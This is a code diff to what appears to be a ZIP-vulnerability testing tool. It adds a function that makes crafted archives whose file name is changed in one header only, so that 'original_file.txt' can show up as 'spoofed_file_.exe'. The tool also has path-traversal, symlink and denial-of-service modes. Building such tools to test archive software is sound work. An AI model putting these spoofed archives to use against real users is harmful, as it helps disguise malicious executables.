@@ -77,6 +77,100 @@ def create_path_traversal(path):
     
     print(f"New ZIP file created named {zip_file} with `{path_traversal_dir}` as a malicious file.")
 
+def create_spoofed_file(zip_file, filename):
+    content = f"Is my name spoofed? If you are not vulnerable, I should have the following file name: {filename}"
+    with zipfile.ZipFile(zip_file, 'a') as zipf:
+        # Add file to the ZIP
+        zipf.writestr(filename, content)
+    
+def spoof_file_name():
+    zip_file = "Archive.zip"
+    path_to_file = ""
+    original_filename = "original_file.txt"
+    spoofed_filename =  "spoofed_file_.exe"
+    
+    # Get/Create ZIP with a file to spoof its name and the spoofed file name to replace the original file name
+    while True:
+        zip_location = input("[+] If you have a ZIP containing the file you wish to spoof, please enter it's location, "
+            "or Press Enter to create a new zip: ").strip()
+        
+        # If user gave a ZIP he would want to work on
+        if zip_location:
+            # Verify ZIP location
+            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
+                # Create a copy of the ZIP that the user gave
+                shutil.copy(zip_location, zip_file)
+
+                # Get the file name to be spoofed
+                while True:
+                    filename_to_spoof = input("[+] Please enter the current name of the file you wish to spoof.\n "
+                        "Please provide the full file path inside the zip (including the file extension), "
+                        "e.g. `src/components/index.js`:(Press enter to automatically create a spoofable file) ").strip()
+                    
+                    # If the user provided a file directory to spoof
+                    if filename_to_spoof:
+                        # Open the ZIP and check if the file exists
+                        with zipfile.ZipFile(zip_file, 'r') as zip_ref:
+                            zip_contents = zip_ref.namelist()
+                            
+                            # Verify file name exists in ZIP
+                            if filename_to_spoof in zip_contents:
+                                # Split the path into directory and file name
+                                path_to_file, original_filename = os.path.split(filename_to_spoof)
+                                
+                                # Get spoofed file name to replace original file name
+                                while True:
+                                    spoofed_filename = input(f"Please insert a spoofed file name to replace the original name `{original_filename}` with.\n"
+                                        f"!! Notice, the spoofed name should contain exactly {len(original_filename)} characters !!\n").strip()
+
+                                    if len(original_filename) != len(spoofed_filename):
+                                        print("Original file name and spoofed Filenames lengths must be equal")
+                                    
+                                    # Exit loop
+                                    else:
+                                        break
+                                
+                                # Exit loop
+                                break
+                            else:
+                                print(f"`{filename_to_spoof}` does not exist in the given zip. Please double check the file name and try again.")                                # Will start loop again and request file name again
+                    
+                    # Add a default file to spoof
+                    else:
+                        create_spoofed_file(zip_file, original_filename)
+                
+                        # Exit loop
+                        break
+                
+                # Exit loop
+                break
+            
+            # ZIP not found
+            else:
+                # Will start loop again and request valid zip location again
+                print("Invalid location, zip not found.")
+        
+        # Create a new ZIP containing a spoofable file
+        else:
+            create_spoofed_file(zip_file, original_filename)
+            
+            # Exit loop
+            break
+
+    # Replace the file name within the ZIP binary data
+    with open(zip_file, 'rb') as zipf:
+        zip_data = zipf.read()
+        # Replace the filename within the ZIP binary data
+        if path_to_file != "":
+            path_to_file = path_to_file + "/"
+        spoofed_data = zip_data.replace(bytes(path_to_file+original_filename, 'utf-8'), bytes(path_to_file+spoofed_filename, 'utf-8'), 1)
+
+    # Write the modified data back to the ZIP file
+    with open(zip_file, 'wb') as zipf:
+        zipf.write(spoofed_data)
+    
+    print(f"New ZIP file created named {zip_file} with spoofed file name `{spoofed_filename}`, replacing `{original_filename}` file name.")
+
 def main():
     global operating_system, default_mode
     try:
@@ -131,7 +225,7 @@ def main():
             case "pt":
                 create_path_traversal(args.path)
             case "fns":
-                print("File name Spoofing selected")
+                spoof_file_name()
             case "sym":
                 print("Symlink selected")
             case "dos":
